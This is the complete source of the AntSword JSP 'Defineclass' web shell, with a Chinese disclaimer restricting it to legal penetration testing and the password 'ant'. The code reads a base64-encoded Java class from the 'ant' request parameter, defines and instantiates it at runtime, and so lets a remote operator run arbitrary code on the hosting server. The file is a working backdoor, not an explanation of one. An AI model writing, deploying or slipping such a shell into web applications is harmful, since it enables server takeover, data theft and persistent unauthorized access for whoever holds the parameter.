<%--
             _   ____                       _
  __ _ _ __ | |_/ ___|_      _____  _ __ __| |
 / _` | '_ \| __\___ \ \ /\ / / _ \| '__/ _` |
| (_| | | | | |_ ___) \ V  V / (_) | | | (_| |
 \__,_|_| |_|\__|____/ \_/\_/ \___/|_|  \__,_|
———————————————————————————————————————————————
    AntSword JSP Defineclass Script
    警告：
        此脚本仅供合法的渗透测试以及爱好者参考学习
         请勿用于非法用途，否则将追究其相关责任！
———————————————————————————————————————————————
pass: ant
--%>
<%!
    class U extends ClassLoader {
        U(ClassLoader c) {
            super(c);
        }
        public Class g(byte[] b) {
            return super.defineClass(b, 0, b.length);
        }
    }

    public byte[] base64Decode(String str) throws Exception {
        try {
            Class clazz = Class.forName("sun.misc.BASE64Decoder");
            return (byte[]) clazz.getMethod("decodeBuffer", String.class).invoke(clazz.newInstance(), str);
        } catch (Exception e) {
            Class clazz = Class.forName("java.util.Base64");
            Object decoder = clazz.getMethod("getDecoder").invoke(null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, str);
        }
    }
%>
<%
    String cls = request.getParameter("ant");
    if (cls != null) {
        new U(this.getClass().getClassLoader()).g(base64Decode(cls)).newInstance().equals(pageContext);
    }
%>
